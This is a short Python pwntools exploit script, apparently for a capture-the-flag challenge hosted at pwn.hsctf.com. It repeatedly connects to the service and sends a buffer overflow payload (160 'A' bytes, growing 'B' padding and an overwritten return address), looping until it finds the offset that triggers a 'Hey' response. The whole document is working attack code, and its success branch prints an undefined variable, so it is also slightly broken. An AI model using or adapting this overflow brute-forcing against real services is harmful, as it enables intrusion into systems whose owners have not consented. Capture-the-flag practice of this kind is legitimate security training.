#!/bin/python3
from pwn import *
import time

padding = b"A"*160
payload = b"\xd5\x11\x40\x00\x00\x00\x00\x00"

i = 0
while True:
    io = remote('pwn.hsctf.com', 5002)
    io.recvuntil("do: ")
    io.sendline(padding+b"B"*(i*8)+payload)
    response = io.recvrepeat(3)
    if (b"Hey" in response):
        print("succes")
        print("offset: %i" % i)
        print(data)
        break
    else:
        i=i+1
        print("failed")
